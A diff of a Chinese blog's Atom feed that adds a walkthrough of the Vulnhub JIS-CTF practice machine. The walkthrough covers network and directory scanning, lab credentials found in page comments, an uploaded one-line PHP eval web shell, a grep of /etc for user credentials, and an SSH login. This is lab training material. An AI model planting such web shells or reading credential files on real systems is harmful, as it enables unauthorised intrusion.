@@ -3,20 +3,149 @@
     <id>https://my011215.github.io</id>
     <title>blog小窝 • Posts by &#34;渗透测试&#34; category</title>
     <link href="https://my011215.github.io" />
-    <updated>2023-05-04T08:30:30.000Z</updated>
+    <updated>2023-05-05T03:30:30.000Z</updated>
     <entry>
-        <id>https://my011215.github.io/2023/05/04/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
+        <id>https://my011215.github.io/2023/05/05/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
         <title>vulnhub靶机学习记录</title>
-        <link rel="alternate" href="https://my011215.github.io/2023/05/04/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
+        <link rel="alternate" href="https://my011215.github.io/2023/05/05/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
         <content type="html">&lt;!-- toc --&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;#jis-ctf&#34;&gt;JIS-CTF&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#jis-ctf&#34;&gt;JIS-CTF&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;#introduce&#34;&gt;introduce&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#penetration-testing&#34;&gt;Penetration testing&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
 &lt;/ul&gt;
 &lt;!-- tocstop --&gt;
 &lt;span id=&#34;more&#34;&gt;&lt;/span&gt;  
 &lt;h2&gt;&lt;span id=&#34;jis-ctf&#34;&gt; JIS-CTF&lt;/span&gt;&lt;/h2&gt;
+&lt;h3&gt;&lt;span id=&#34;introduce&#34;&gt; introduce&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;主要的漏洞是任意文件上传，同时结合渗透测试和 ctf 的相关知识去获取一共 5 个 flag。&lt;br&gt;
+下载地址：&lt;a href=&#34;https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/&#34;&gt;https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/&lt;/a&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;flag1&lt;br&gt;
+ 目录扫描，在可见 flag 文件里&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;flag2&lt;br&gt;
+ 目录扫描，在有提示的可以目录源代码中。有点 ctf 味道，实际渗透也可以思索前端信息利用。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;flag3&lt;br&gt;
+ 任意文件上传，蚁剑连接，在相关文件中查找到隐藏 flag&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;flag4&lt;br&gt;
+ 查找相关文件可以获取到其他用户信息密码&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;flag5&lt;br&gt;
+ 使用其他用户信息和密码进行暴露的 ssh 端口连接&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;&lt;span id=&#34;penetration-testing&#34;&gt; Penetration testing&lt;/span&gt;&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;信息收集&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;查找网卡当前设备&lt;br&gt;
+获取到目标主机 ip&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;netdiscover -i eth0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/375.png?raw=true&#34; alt&gt;&lt;br&gt;
+ip 大概率是 192.168.21.138&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;namp 扫描&lt;br&gt;
+对目标进行 ping 检测，不进行端口扫描（会发送四种报文确定目标是否存活，）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nmap -sn 192.168.21.0/24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/376.png?raw=true&#34; alt&gt;&lt;br&gt;
+对端口上的服务程序版本进行扫描&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nmap -sV 192.168.21.138&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/377.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;80 端口查看&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/378.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;目录扫描&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dirb http://192.168.21.138&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/379.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;查看相关目录结构信息&lt;br&gt;
+ get flag1&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/380.png?raw=true&#34; alt&gt;&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/381.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;总结可以路径，获取更大探索目标&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;可疑路径&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Disallow: /&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Disallow: /backup&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Disallow: /admin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Disallow: /admin_area&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Disallow: /r00t&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Disallow: /uploads&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Disallow: /uploaded_files&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Disallow: /flag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/assets&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/css&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/js&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/server-status&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/admin_area/index.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;get flag2&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/382.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;得到登录账号信息&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!--	username : admin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	password : 3v1l_H@ck3r&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	The 2nd flag is : &amp;#123;7412574125871236547895214&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;发掘漏洞&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/383.png?raw=true&#34; alt&gt;&lt;br&gt;
+文件上传咩，试一试 php 文件能传不&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;1.php&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php @eval($POST_[&amp;#x27;cmd&amp;#x27;]) ?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/384.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;获取文件上传路径&lt;br&gt;
+翻了一波，在上面敏感路径拼凑得到&lt;br&gt;
+ /uploaded_files/1.php&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/385.png?raw=true&#34; alt&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;漏洞利用&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;蚁剑连接后门，查看网站内部文件&lt;br&gt;
+ get flag3&lt;br&gt;
+hint.txt&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/386.png?raw=true&#34; alt&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;提示让我们获取另外一个账号去读取 flag.txt 文件，之前也读过 flag.txt 文件，发现权限不够，读取不了。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;查找用户名&lt;br&gt;
+这个操作系统环境搭建的时候是 Linux，之前阅读过相关文章了解到用户名和密码会存储在 /etc/passwd/ 或者 /etc/shadow/&lt;br&gt;
+ 一般是在第二个路径，第一个路径不会显示完全&lt;br&gt;
+但是呢，我读取失败了，看到网站这么多文件，我总不能一个一个翻吧。&lt;br&gt;
+于是乎，我打开了蚁剑的虚拟终端，使用 shell 命令查找相关文件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;grep -sr technawi /etc/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;不显示错误信息查找子目录和 technawi 有关的文件&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/387.png?raw=true&#34; alt&gt;&lt;br&gt;
+非常好，范围缩小了很多&lt;br&gt;
+ get flag4&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/388.png?raw=true&#34; alt&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;ssh 连接&lt;br&gt;
+之前也尝试过用 admin 密码进行 ssh 连接，但是都被拒绝了。&lt;br&gt;
+后门也尝试使用 technawi 进行登录框登录，但是没有获取其他有用信息。&lt;br&gt;
+get flag5&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/389.png?raw=true&#34; alt&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;总结&lt;br&gt;
+这个靶场属于简单的类型，主要就是任意文件上传加上一个 ssh 远程连接。其他主要考察信息利用，感觉多刷还是可以的，有感觉，自然而然拓宽了渗透思路和打法。这种感觉比打 ctf 更清晰命令，还是比较适合渗透小白的我练习！&lt;/li&gt;
+&lt;/ol&gt;
 </content>
-        <updated>2023-05-04T08:30:30.000Z</updated>
+        <updated>2023-05-05T03:30:30.000Z</updated>
     </entry>
     <entry>
         <id>https://my011215.github.io/2023/03/31/Penetration%20testing/Web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/</id>
